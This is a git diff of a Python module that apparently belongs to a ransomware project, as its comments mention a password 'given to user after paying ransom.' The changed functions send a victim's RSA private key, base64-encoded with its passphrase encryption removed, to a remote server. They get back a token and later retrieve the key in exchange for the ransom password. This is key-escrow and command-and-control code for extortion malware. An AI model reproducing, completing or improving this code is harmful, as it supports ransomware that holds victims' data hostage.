@@ -5,7 +5,7 @@ from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKeyWithSerial
 import json
 import os
 import requests
-import pdb
+import base64
 
 # TODO: Transform the returned json into string objects
 
@@ -15,22 +15,27 @@ import pdb
 #   @return: AppKey to be able to retrieve the private key from server. 
 ############################################################################
 def post(privKey):
-    privKey = getBytes(privKey)
-    
+    privKey = getFormatedKey(privKey)
     # appKey = authUser()
     while True:
-        r = requests.post(const.POST, data={'key1' : privKey })
-        if (r.status_code() == 200):
+        response = requests.post(const.POST, data={'privateKey' : privKey })
+        if (response.status_code == 200):
             break
-    return r.text
+    
+    return response.json()['token']
 
+############################################################################
+#   Posts public and private key to the server
+#   @params: AppKey > From Local File, password > Password given to user after
+#            paying ransom.
+#   @return: String version of the key stored on the server 
+############################################################################
 def get(appKey, password):
     while True:
-        r = requests.get(const.GET, data={'key1':appKey, 'key2':password})
-        if(r.status_code == 200):
+        response = requests.get(const.GET, data={'appKey':appKey}, headers={'password':password})
+        if(response.status_code == 200):
             break 
-    return r.text
-
+    return response.json()['privateKey']
 
 def authUser():
     while True:
@@ -46,14 +51,16 @@ def authUser():
 #   @params: pubKey -> Public Key, privKey -> Private Key
 #   @return: serialized keys in bytes 
 ############################################################################
-def getBytes(privKey):
+def getFormatedKey(privKey):
     privKey = privKey.private_bytes(
             encoding = serialization.Encoding.PEM,
             format=serialization.PrivateFormat.TraditionalOpenSSL,
-            encryption_algorithm=serialization.BestAvailableEncryption(b"penguinflower"),
+            encryption_algorithm=serialization.NoEncryption()
         )
+    privKey = base64.b64encode(privKey)
+
+
     # pubKey = pubKey.public_bytes(
     #         encoding=serialization.Encoding.PEM,
     #         format=serialization.PublicFormat.SubjectPublicKeyInfo)
-    return privKey
-
+    return str(privKey)
